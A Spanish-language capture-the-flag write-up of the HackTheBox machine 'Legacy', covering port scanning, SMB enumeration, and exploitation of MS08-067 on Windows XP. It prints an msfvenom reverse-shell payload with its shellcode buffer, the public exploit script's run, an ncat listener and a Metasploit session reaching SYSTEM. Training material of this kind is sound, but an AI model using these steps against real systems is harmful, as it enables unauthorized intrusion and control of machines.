---
title: "HTB writeup: Legacy"
date: 2019-11-06T07:25:53-06:00
description: "Writeup de Legacy, otra maquina retirada de hackthebox que nos enseña sobre SMBv1"
tags: ["hackthebox", "htb", "retired", "pentesting"]
categories: ["htb", "pentesting"]

---

Ahora es turno de la maquina Legacy, otra de las primeras maquinas disponibles en hackthebox y de la cual existen muchísimos escritos y videos de como resolverla. Me gusto mucho que si bien, la vulnerabilidad no era tan directa como la maquina anterior, una buena enumeración de los servicios y técnicas un poco mas agresivas nos pueden dar resultados muy interesantes. En esta ocasión, trataré de escribir la solución de acuerdo a las notas que tome esta semana cuando la resolví.
<!--more-->

# Machine info
La información que tenemos de la máquina es:

| Name | Maker | OS  | IP Address |
| ---- | ----- | --- | ---------- |
| ![legacy image](https://www.hackthebox.eu/storage/avatars/60dc190c4c015cfe3a3aef9b5afca254_thumb.png) [legacy](https://www.hackthebox.eu/home/machines/profile/2) | [ch4p](https://www.hackthebox.eu/home/users/profile/1) | Linux | 10.10.10.4 |

Su tarjeta de presentación es:

![cardinfo](/img/htb-legacy/cardinfo.png)


# Port Scanning

Iniciamos por ejecutar dos `nmap` para identificar puertos udp y tcp abiertos:

```text
root@laptop:~# nmap -sS -p- --open -n -v 10.10.10.4
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-08 13:16 CST
Initiating Ping Scan at 13:16
Scanning 10.10.10.4 [4 ports]
Completed Ping Scan at 13:16, 0.11s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:16
Scanning 10.10.10.4 [65535 ports]
Discovered open port 445/tcp on 10.10.10.4
Discovered open port 139/tcp on 10.10.10.4
SYN Stealth Scan Timing: About 14.45% done; ETC: 13:20 (0:03:04 remaining)
SYN Stealth Scan Timing: About 32.21% done; ETC: 13:20 (0:02:08 remaining)
SYN Stealth Scan Timing: About 56.10% done; ETC: 13:19 (0:01:11 remaining)
SYN Stealth Scan Timing: About 78.51% done; ETC: 13:19 (0:00:33 remaining)
Completed SYN Stealth Scan at 13:19, 142.82s elapsed (65535 total ports)
Nmap scan report for 10.10.10.4
Host is up (0.055s latency).
Not shown: 65532 filtered ports, 1 closed port
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 143.06 seconds
           Raw packets sent: 131178 (5.772MB) | Rcvd: 111 (4.864KB)

root@laptop:~# nmap -sU -p- --open -n -v 10.10.10.4
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-08 13:20 CST
Initiating Ping Scan at 13:20
Scanning 10.10.10.4 [4 ports]
Completed Ping Scan at 13:20, 0.09s elapsed (1 total hosts)
Initiating UDP Scan at 13:20
Scanning 10.10.10.4 [65535 ports]
Discovered open port 137/udp on 10.10.10.4
Completed UDP Scan at 13:53, 2009.34s elapsed (65535 total ports)
Nmap scan report for 10.10.10.4
Host is up (0.055s latency).
Not shown: 65534 open|filtered ports
PORT    STATE SERVICE
137/udp open  netbios-ns

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2009.57 seconds
           Raw packets sent: 131126 (3.680MB) | Rcvd: 55 (13.420KB)
```

- `-sS` para escaneo TCP vía SYN
- `-sU` para escaneo UDP
- `-p-` para todos los puertos TCP
- `--open` para que solo me muestre resultados de puertos abiertos
- `-n` para no ejecutar resoluciones
- `-v` para modo *verboso*

Como en otras ocasiones, verificamos los puertos abiertos con `masscan`:

```text
root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.4

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-10-06 03:15:47 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 139/tcp on 10.10.10.4
Discovered open port 445/tcp on 10.10.10.4
Discovered open port 137/udp on 10.10.10.4
```

- `-e tun0` para ejecutarlo nada mas en la interface tun0
- `-p0-65535,U:0-65535` TODOS los puertos (TCP y UDP)
- `--rate 500` para mandar 500pps y no sobre cargar la VPN ):

Como podemos ver los puertos son los mismos, por lo que iniciamos por identificar los servicios nuevamente con `nmap`.

# Services Identification

Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):

```text
root@laptop:~# nmap -sV -sC -p139,445,U:137 -v -n 10.10.10.4
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-05 22:58 CDT
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 22:58
Completed NSE at 22:58, 0.00s elapsed
Initiating NSE at 22:58
Completed NSE at 22:58, 0.00s elapsed
Initiating NSE at 22:58
Completed NSE at 22:58, 0.00s elapsed
Initiating Ping Scan at 22:58
Scanning 10.10.10.4 [4 ports]
Completed Ping Scan at 22:58, 0.26s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:58
Scanning 10.10.10.4 [2 ports]
Discovered open port 139/tcp on 10.10.10.4
Discovered open port 445/tcp on 10.10.10.4
Completed SYN Stealth Scan at 22:58, 0.26s elapsed (2 total ports)
Initiating Service scan at 22:58
Scanning 2 services on 10.10.10.4
Completed Service scan at 22:58, 6.92s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.4.
Initiating NSE at 22:58
Completed NSE at 22:59, 51.78s elapsed
Initiating NSE at 22:59
Completed NSE at 22:59, 0.00s elapsed
Initiating NSE at 22:59
Completed NSE at 22:59, 0.00s elapsed
map scan report for 10.10.10.4
Host is up (0.21s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: -4h45m20s, deviation: 2h07m16s, median: -6h15m20s
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:a4:2c:5b (VMware)
| Names:
|   LEGACY<00>           Flags: <unique><active>
|   HTB<00>              Flags: <group><active>
|   LEGACY<20>           Flags: <unique><active>
|   HTB<1e>              Flags: <group><active>
|   HTB<1d>              Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2019-10-06T03:42:50+03:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

NSE: Script Post-scanning.
Initiating NSE at 22:59
Completed NSE at 22:59, 0.00s elapsed
Initiating NSE at 22:59
Completed NSE at 22:59, 0.00s elapsed
Initiating NSE at 22:59
Completed NSE at 22:59, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.87 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

- `-sC` para que ejecute los scripts safe-discovery de nse
- `-sV` para que me traiga el banner del puerto
- `-p139,445,U:137` para unicamente los puertos descubiertos previamente
- `-n` para no ejecutar resoluciones

Los scripts de enumeración iniciales sobre el puerto de netbios y de smb nos devuelven información sobre la versión de sistema operativo, el nombre de la computadora y el grupo al que pertenece. Sin embargo, no tenemos información sobre las versiones o algo que nos ayude a identificar mas sobre la máquina. Veamos que podemos obtener de netbios en la siguiente sección.

# NBT Service Enumeration

Ejecutamos ntbscan en modo _verbose_ para obtener una salida mas detallada:

```text
(impacket-a2aNp99x) xbytemx@laptop:~/git/impacket$ nbtscan -v 10.10.10.4
Doing NBT name scan for addresses from 10.10.10.4


NetBIOS Name Table for Host 10.10.10.4:

Name             Service          Type
----------------------------------------
LEGACY           <00>             UNIQUE
HTB              <00>              GROUP
LEGACY           <20>             UNIQUE
HTB              <1e>              GROUP
HTB              <1d>             UNIQUE
__MSBROWSE__  <01>              GROUP

Adapter address: 00:50:56:a4:2c:5b
----------------------------------------
```

Verificamos que esta información fue la misma entregada por el script de nmap, por lo que ahora podemos ver que independientemente de los servicios y los types no hay información adicional que nos pueda servir. Continuemos hacia smb.

# SMB Service Enumeration

Ahora, en lugar de usar smbclient o smbclient.py, iniciare con un script de nmap que me ayude a hacer un descubrimiento de la versión de smb:

```
root@laptop:~# nmap -pT:445,U:137,T:139 -sU -sS -n -v -Pn --script smb-protocols.nse -sV -sC 10.10.10.4
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-06 07:53 CST
NSE: Loaded 46 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 07:53
Completed NSE at 07:53, 0.00s elapsed
Initiating NSE at 07:53
Completed NSE at 07:53, 0.00s elapsed
Initiating SYN Stealth Scan at 07:53
Scanning 10.10.10.4 [2 ports]
Discovered open port 445/tcp on 10.10.10.4
Discovered open port 139/tcp on 10.10.10.4
Completed SYN Stealth Scan at 07:53, 0.12s elapsed (2 total ports)
Initiating UDP Scan at 07:53
Scanning 10.10.10.4 [1 port]
Discovered open port 137/udp on 10.10.10.4
Completed UDP Scan at 07:53, 0.12s elapsed (1 total ports)
Initiating Service scan at 07:53
Scanning 3 services on 10.10.10.4
Completed Service scan at 07:53, 6.37s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.4.
Initiating NSE at 07:53
Completed NSE at 07:54, 50.68s elapsed
Initiating NSE at 07:54
Completed NSE at 07:54, 0.00s elapsed
Nmap scan report for 10.10.10.4
Host is up (0.083s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
137/udp open  netbios-ns   Microsoft Windows netbios-ns (workgroup: HTB)
Service Info: Host: LEGACY; OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-protocols:
|   dialects:
|_    NT LM 0.12 (SMBv1) [dangerous, but default]

NSE: Script Post-scanning.
Initiating NSE at 07:54
Completed NSE at 07:54, 0.00s elapsed
Initiating NSE at 07:54
Completed NSE at 07:54, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.91 seconds
           Raw packets sent: 3 (166B) | Rcvd: 3 (336B)
```

Bien, ahora que tenemos identificado que se trata de un Windows XP, que usa SMBv1 como casi todas las maquinas por defecto, tratemos de buscar vía la categoría vuln, vulnerabilidades en esta maquina.

> Algo muy interesante que encontré, fue que cuando explore la carpeta scripts en busca de herramientas para la enumeración, me encontré con herramientas para la detección de vulnerabilidades. Fue por esto que opte por ejecutar la categoría sobre los puertos.

```
root@laptop:~# nmap -pT:445,U:137,T:139 -sU -sS -n -v -Pn --script vuln -sV -sC 10.10.10.4
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-06 08:07 CST
NSE: Loaded 149 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:07
Completed NSE at 08:07, 10.00s elapsed
Initiating NSE at 08:07
Completed NSE at 08:07, 0.00s elapsed
Initiating SYN Stealth Scan at 08:07
Scanning 10.10.10.4 [2 ports]
Discovered open port 139/tcp on 10.10.10.4
Discovered open port 445/tcp on 10.10.10.4
Completed SYN Stealth Scan at 08:07, 1.52s elapsed (2 total ports)
Initiating UDP Scan at 08:07
Scanning 10.10.10.4 [1 port]
Discovered open port 137/udp on 10.10.10.4
Completed UDP Scan at 08:07, 0.12s elapsed (1 total ports)
Initiating Service scan at 08:07
Scanning 3 services on 10.10.10.4
Completed Service scan at 08:07, 6.34s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.4.
Initiating NSE at 08:07
Completed NSE at 08:07, 5.25s elapsed
Initiating NSE at 08:07
Completed NSE at 08:07, 0.03s elapsed
Nmap scan report for 10.10.10.4
Host is up (0.079s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
137/udp open  netbios-ns   Microsoft Windows netbios-ns (workgroup: HTB)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
Service Info: Host: LEGACY; OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

NSE: Script Post-scanning.
Initiating NSE at 08:07
Completed NSE at 08:07, 0.00s elapsed
Initiating NSE at 08:07
Completed NSE at 08:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.06 seconds
           Raw packets sent: 4 (210B) | Rcvd: 3 (336B)
```

Como podemos ver, la maquina dio positivo a dos vulnerabilidades, la MS08-067 y la MS17-010. Dos de las vulnerabilidades mas famosas de SMB porque han sido utilizadas por worms ya que no requieren autenticación o dependencia alguna de la maquina para poder explotar vulnerabilidades y alcanzar el anillo 0.

# Exploiting MS08-067

Hay varios caminos podemos usar para explotar esta vulnerabilidad, la más fácil y más común es utilizar metasploit-framework que ya tiene el "todo en uno" para esta vulnerabilidad. Iniciare por explotar la vulnerabilidad con ms08_067_2018.py:

## ms08_067.py

Para explotar esta vulnerabilidad con este script, primero necesitamos clonar el [repositorio](https://github.com/andyacer/ms08_067), después cumplir con las dependencias y finalmente preparar el entorno.

```
xbytemx@laptop:~/git$ git clone https://github.com/andyacer/ms08_067
Clonando en 'ms08_067'...
remote: Enumerating objects: 37, done.
remote: Total 37 (delta 0), reused 0 (delta 0), pack-reused 37
Desempaquetando objetos: 100% (37/37), listo.
xbytemx@laptop:~/git$ cd ms08_067/
xbytemx@laptop:~/git/ms08_067$ python ms08_067_2018.py
#######################################################################
#   MS08-067 Exploit
...
```

Ahora que tenemos todo lo que necesitamos, debemos preparar la shellcode con msfvenom:

```
xbytemx@laptop:~/git/ms08_067$ msfvenom --payload windows/shell_reverse_tcp --nopsled 7 LHOST=10.10.14.26 LPORT=3001 EXITFUNC=thread --bad-chars "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -e x86/jmp_call_additive -a x86 --platform windows
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 353 (iteration=0)
x86/jmp_call_additive chosen with final size 353
Successfully added NOP sled of size 7 from x86/single_byte
Payload size: 360 bytes
Final size of c file: 1536 bytes
unsigned char buf[] =
"\x4b\xfd\x93\x90\xd6\xf8\x90\xfc\xbb\xc1\x87\xd9\xf4\xeb\x0c"
"\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff"
"\xff\xff\x3d\x6f\x5b\xf4\xbd\x70\x3c\x7c\x58\x41\x7c\x1a\x29"
"\xf2\x4c\x68\x7f\xff\x27\x3c\x6b\x74\x45\xe9\x9c\x3d\xe0\xcf"
"\x93\xbe\x59\x33\xb2\x3c\xa0\x60\x14\x7c\x6b\x75\x55\xb9\x96"
"\x74\x07\x12\xdc\x2b\xb7\x17\xa8\xf7\x3c\x6b\x3c\x70\xa1\x3c"
"\x3f\x51\x74\x36\x66\x71\x77\x9b\x12\x38\x6f\xf8\x1f\xf2\x04"
"\xca\xd4\x05\xcc\x02\x14\xa9\x31\xab\xe7\xb3\x76\x0c\x18\xc6"
"\x8e\x6e\xa5\xd1\x55\x0c\x71\x57\x4d\xb6\xf2\xcf\xa9\x46\xd6"
"\x96\x3a\x44\x93\xdd\x64\x49\x22\x31\x1f\x75\xaf\xb4\xcf\xff"
"\xeb\x92\xcb\xa4\xa8\xbb\x4a\x01\x1e\xc3\x8c\xea\xff\x61\xc7"
"\x07\xeb\x1b\x8a\x4f\xd8\x11\x34\x90\x76\x21\x47\xa2\xd9\x99"
"\xcf\x8e\x92\x07\x08\xf0\x88\xf0\x86\x0f\x33\x01\x8f\xcb\x67"
"\x51\xa7\xfa\x07\x3a\x37\x02\xd2\xed\x67\xac\x8d\x4d\xd7\x0c"
"\x7e\x26\x3d\x83\xa1\x56\x3e\x49\xca\xfd\xc5\x1a\xff\x0b\xcb"
"\xc0\x97\x09\xd3\xff\xde\x87\x35\x95\x30\xce\xee\x02\xa8\x4b"
"\x64\xb2\x35\x46\x01\xf4\xbe\x65\xf6\xbb\x36\x03\xe4\x2c\xb7"
"\x5e\x56\xfa\xc8\x74\xfe\x60\x5a\x13\xfe\xef\x47\x8c\xa9\xb8"
"\xb6\xc5\x3f\x55\xe0\x7f\x5d\xa4\x74\x47\xe5\x73\x45\x46\xe4"
"\xf6\xf1\x6c\xf6\xce\xfa\x28\xa2\x9e\xac\xe6\x1c\x59\x07\x49"
"\xf6\x33\xf4\x03\x9e\xc2\x36\x94\xd8\xca\x12\x62\x04\x7a\xcb"
"\x33\x3b\xb3\x9b\xb3\x44\xa9\x3b\x3b\x9f\x69\x5b\xde\x35\x84"
"\xf4\x47\xdc\x25\x99\x77\x0b\x69\xa4\xfb\xb9\x12\x53\xe3\xc8"
"\x17\x1f\xa3\x21\x6a\x30\x46\x45\xd9\x31\x43\x45\xdd\xcd\x6c";
```

- `-p windows/shell_reverse_tcp` Seleccionamos como payload, que vamos a realizar una reverse shell tcp inline de windows
- `LHOST=10.10.14.26 LPORT=3001 EXITFUNC=thread` Como opciones del payload, definimos el host, el puerto y muy importante, el método de salida para no bloquear accesos posteriores
- `-b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"` En esta parte definimos los badchars o los caracteres que no podemos transmitir sobre la red sin romper la comunicación
- `-nopsled 7` le agregfamos 7 NOP al inicio
- `-f c` El formato de salida es tipo lenguaje C
- `-e x86/jmp_call_additive` Seleccionamos el tipo de encoding jmp call additive para hacerlo mas acertado a la estructura ROP que se genera en el exploit
- `-a x86` La arquitectura destino es x86
- `--platform windows` La plataforma donde funcionara es windows.

Usar una reverse shell es menos ruidosa que subir todo meterpreter y levantar alarmas.

Sustituimos la salida en el script de python, levantamos un ncat y lanzamos el script:

```
xbytemx@laptop:~/git/ms08_067$ python2 ms08_067_2018.py 10.10.10.4 7 445
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer:
#   - Added support for selecting a target port at the command line.
#     It seemed that only 445 was previously supported.
#   - Changed library calls to correctly establish a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste
#     into this source file.
#######################################################################

Windows XP SP3 English (AlwaysOn NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish
```

En la remota:

```
xbytemx@laptop:~$ ncat -vnlp 3001
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::3001
Ncat: Listening on 0.0.0.0:3001
Ncat: Connection from 10.10.10.4.
Ncat: Connection from 10.10.10.4:1029.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
C:\WINDOWS\system32>systeminfo
systeminfo

Host Name:                 LEGACY
OS Name:                   Microsoft Windows XP Professional
OS Version:                5.1.2600 Service Pack 3 Build 2600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Uniprocessor Free
Registered Owner:          user
Registered Organization:   HTB
Product ID:                55274-643-7213323-23904
Original Install Date:     16/3/2017, 7:32:23
System Up Time:            0 Days, 0 Hours, 19 Minutes, 35 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~1998 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     511 MB
Available Physical Memory: 395 MB
Virtual Memory: Max Size:  2.048 MB
Virtual Memory: Available: 2.009 MB
Virtual Memory: In Use:    39 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
NetWork Card(s):           1 NIC(s) Installed.
                           [01]: AMD PCNET Family PCI Ethernet Adapter
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.4

C:\WINDOWS\system32>
```

## Metasploit
Iniciamos metasploit y seleccionamos **exploit(/windows/smb/ms08_067_netapi**. Inicializamos las variables con sus valores correspondientes y ejecutamos "exploit":

```
msf5 > search ms08-067

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption


msf5 exploit(windows/smb/ms08_067_netapi) > use exploit/windows/smb/ms08_067_netapi
msf5 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.10.10.4       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.23      yes       The listen address (an interface may be specified)
   LPORT     3002             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


msf5 exploit(windows/smb/ms08_067_netapi) >
msf5 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.14.23:3002
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (180291 bytes) to 10.10.10.4
[*] Meterpreter session 2 opened (10.10.14.23:3002 -> 10.10.10.4:1030) at 2019-10-06 01:45:42 -0500

meterpreter >
```

Así de rápido y sencillo, tenemos un meterpreter ejecutándose del lado remoto hacia nuestra maquina.

```
meterpreter > sysinfo
Computer        : LEGACY
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

*getuid* nos entrega lo que ya sabíamos de este exploit, al abusar de la vulnerabilidad alcanzamos el usuario mas privilegiado en la maquina. A partir de aquí, leer los archivos de user.txt y root.txt es muy sencillo.

# user.txt

```
meterpreter > type C:\Documents and Settings\john\Desktop\user.txt
```

# root.txt

```
meterpreter > type C:\Documents and Settings\Administrator\Desktop\root.txt
```

... And we got root and user flag.

---

Gracias por llegar hasta aquí, hasta la próxima!
